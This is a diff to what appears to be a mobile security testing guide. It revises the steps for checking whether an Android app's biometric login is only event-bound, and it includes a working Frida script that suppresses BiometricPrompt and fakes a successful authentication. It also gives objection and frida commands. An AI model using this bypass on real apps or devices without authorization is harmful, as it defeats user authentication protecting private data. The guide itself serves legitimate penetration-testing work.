@@ -81,30 +81,57 @@ A key that is software-backed, or whose authentication requirement is not enforc
 
 ### 4. Attempt the runtime bypass
 
-The standard test is to try the event-bound bypass and observe whether it succeeds. With Objection:
+The standard test is to try the event-bound bypass and observe whether it succeeds. objection has a built-in bypass only for iOS (`ios ui biometrics_bypass`); on Android, use it for reconnaissance and do the bypass with Frida:
 
 ```bash
-objection --gadget com.target.app explore
-android hooking watch class 'androidx.biometric.BiometricPrompt'
-android biometrics-bypass
+objection -g com.target.app explore
+# then, inside objection:
+android hooking watch class android.hardware.biometrics.BiometricPrompt
 ```
 
-Or with a Frida hook that invokes the success callback directly:
+The Frida script below suppresses the prompt and fires `onAuthenticationSucceeded` directly. It hooks the platform `android.hardware.biometrics.BiometricPrompt`, which the androidx library delegates to on Android 9 (API 28) and later, and it passes the app's own `CryptoObject` back unauthenticated so you can see whether the Keystore refuses to use it:
 
 ```javascript
 Java.perform(function () {
-  var Prompt = Java.use('androidx.biometric.BiometricPrompt');
-  Prompt.authenticate.overload(
-    'androidx.biometric.BiometricPrompt$PromptInfo'
-  ).implementation = function (info) {
-    console.log('[+] event-bound authenticate() intercepted');
-    // locate the callback held by the prompt and fire onAuthenticationSucceeded
-    var Result = Java.use('androidx.biometric.BiometricPrompt$AuthenticationResult');
-    var cb = this.mAuthenticationCallback ? this.mAuthenticationCallback.value : null;
-    if (cb) { cb.onAuthenticationSucceeded(Result.$new(null, 2)); }
-  };
+  const BP = Java.use('android.hardware.biometrics.BiometricPrompt');
+  const Result = Java.use('android.hardware.biometrics.BiometricPrompt$AuthenticationResult');
+  const Runnable = Java.use('java.lang.Runnable');
+  let n = 0;
+
+  function makeResult(crypto) {
+    try { return Result.$new(crypto, 2); }    // API 30+: (CryptoObject, AUTHENTICATION_RESULT_TYPE_BIOMETRIC)
+    catch (e) { return Result.$new(crypto); } // API 28-29: (CryptoObject)
+  }
+  function fireSuccess(executor, callback, crypto) {
+    const Fire = Java.registerClass({
+      name: 'gt.FireSuccess' + (n++),
+      implements: [Runnable],
+      methods: { run: function () { callback.onAuthenticationSucceeded(makeResult(crypto)); } }
+    });
+    executor.execute(Fire.$new());
+  }
+
+  BP.authenticate.overload('android.os.CancellationSignal', 'java.util.concurrent.Executor',
+      'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
+    .implementation = function (cancel, executor, callback) {
+      console.log('[!] authenticate() without CryptoObject: prompt suppressed');
+      fireSuccess(executor, callback, null);
+    };
+  BP.authenticate.overload('android.hardware.biometrics.BiometricPrompt$CryptoObject',
+      'android.os.CancellationSignal', 'java.util.concurrent.Executor',
+      'android.hardware.biometrics.BiometricPrompt$AuthenticationCallback')
+    .implementation = function (crypto, cancel, executor, callback) {
+      console.log('[*] authenticate() with CryptoObject: passing it back unauthenticated');
+      fireSuccess(executor, callback, crypto);
+    };
 });
 ```
+
+```bash
+frida -U -f com.target.app -l biometric-bypass.js
+```
+
+A longer version that also logs what `Cipher.doFinal` and `Signature.sign` do afterwards is in our [MASWE-0020 note](/mobile/maswe-0020-local-authentication-bypass/).
 
 **Interpretation of the result is the whole test.** If the app proceeds to its protected screen, the biometric check was event-bound and is bypassed. If the app proceeds but then fails to decrypt — throwing `IllegalBlockSizeException` with a `KeyStoreException: Key user not authenticated` cause — the key binding is real and the control held. Record which of the two happened; that distinction is the finding.
 
